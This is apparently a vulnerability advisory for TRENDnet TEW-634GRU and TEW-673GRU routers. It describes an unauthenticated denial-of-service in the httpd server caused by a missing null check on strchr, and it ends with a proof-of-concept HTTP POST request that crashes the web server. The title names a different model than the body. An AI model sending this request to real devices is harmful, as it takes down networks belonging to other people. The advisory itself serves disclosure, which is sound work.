# TEW-652BRP

## Firmware version
TEW-634GRU devices trhough 1.01b14
TEW-673GRU devices through 1.00b40

firmware download url: 
https://downloads.trendnet.com/tew-634gru/firmware/tew-634gruv1_(fw1.01b14).zip
https://downloads.trendnet.com/tew-673gru/firmware/tew-673gru_fw100b40.zip


## Description
Multiple TRENDnet devices can be attacked due to an unauthenticated denial-of-service vulnerability in the httpd web server because the URL path processing lacks a check on strchr return value.

## Detail
The vulnerability is located in the `httpd_main` function of the `httpd` web server of affected devices.

The vulnerable code directly access the returned string pointer of `strchr()` function call, which can be nullable. Consequently, an attacker can construct a URL path that does not contain the expected character `.` to trigger the vulnerability.

The following is the vulnerable code:

![vulnerable_code](soap_action_overflow.png)

We've constructed a PoC to successfully trigger the vulnerability, which led to a crash in the web server:

```txt
POST /vct_lan_00 HTTP/1.1
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
User-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.143 Safari/537.36
Content-Type: 104
Content-Length: 49

html_response_page=wzqwzqwzq&p_default_key=
```
